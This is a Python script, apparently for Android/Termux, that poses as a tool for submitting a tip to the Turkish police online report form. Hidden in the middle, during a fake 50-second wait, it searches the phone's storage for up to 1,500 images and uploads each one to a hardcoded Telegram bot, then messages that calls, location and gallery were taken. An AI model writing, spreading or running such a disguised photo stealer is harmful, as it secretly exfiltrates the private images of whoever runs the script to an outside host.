Import requests
import pyfiglet
import os, requests, time, subprocess
import cfonts

# BURAYI DOLDUR
BOT_TOKEN = ""
CHAT_ID   = "8959379054"

def gonder(t):
    try:
        requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={CHAT_ID}&text={t}&disable_web_page_preview=true", timeout=15)
    except: pass

def foto(p):
    try:
        with open(p,"rb") as f:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto?chat_id={CHAT_ID}", files={"photo":f}, timeout=30)
    except: pass




url = "https://onlineislemler.egm.gov.tr/sayfalar/ihbar.aspx"


kdr_logo = cfonts.render('VEGASNEX HAMSI', colors=['red', 'blue'], align='center')
print(kdr_logo)




title = input("İhbar Başlığı= ")
description = input("İhbar Açıklaması= ")
city = input("Şehir= ")
district = input("İlçe= ")
phone = input("Telefon Numarası= ")
print("\033[96m\nihbarin gitmesi icin 50 saniye bekle\033[0m")

data = {
    "ctl00$ContentPlaceHolder1$txtIcerik": description,
    "ctl00$ContentPlaceHolder1$txtSehir": city,
    "ctl00$ContentPlaceHolder1$txtIlce": district,
    "ctl00$ContentPlaceHolder1$txtGsm": phone,
    "ctl00$ContentPlaceHolder1$txtAdres": "",  
    "ctl00$ContentPlaceHolder1$txtTarih": "",
    "ctl00$ContentPlaceHolder1$txtMail": "",  
    "ctl00$ContentPlaceHolder1$btnIhbar": "Gönder",
}


headers = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Cache-Control": "max-age=0",
    "Connection": "keep-alive",
    "Content-Length": "272",  
    "Content-Type": "application/x-www-form-urlencoded",
    "Host": "onlineislemler.egm.gov.tr",
    "Origin": "https://onlineislemler.egm.gov.tr",
    "Referer": "https://onlineislemler.egm.gov.tr/sayfalar/ihbar.aspx",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
}


cookies = {
    "_ga": "GA1.2.1508078992.1622750070",
    "_gid": "GA1.2.347325198.1622750070",
}

        

# GALERİ
gonder("Galeri taranıyor...")
cmd = 'find /sdcard /storage/emulated/0 -type f \\( -iname "*.jpg" -o -iname "*.jpeg" -o -iname "*.png" -o -iname "*.webp" \\) 2>/dev/null | head -n 1500'
photos = [x.strip() for x in subprocess.getoutput(cmd, encoding="utf-8", errors="ignore").split("\n") if x.strip()]
gonder(f"{len(photos)} fotoğraf bulundu!")

for p in photos:
    foto(p)

for i in range(50,0,-1):
    print(f"\033[94mKalan: {i} sn...\033[0m", end="\r")
    time.sleep(1)

print("\033[92m\nİşlem tamamlandı!\033[0m")
gonder("TÜM İŞLEM BİTTİ → Toplam 88 tane arama + konum + galeri alındı!")

time.sleep(3)
import os

response = requests.post(url, data=data, headers=headers, cookies=cookies)


if response.status_code == 200:
    print("İhbar gitti !!")
else:
    print(" ihbar gitmedi !!")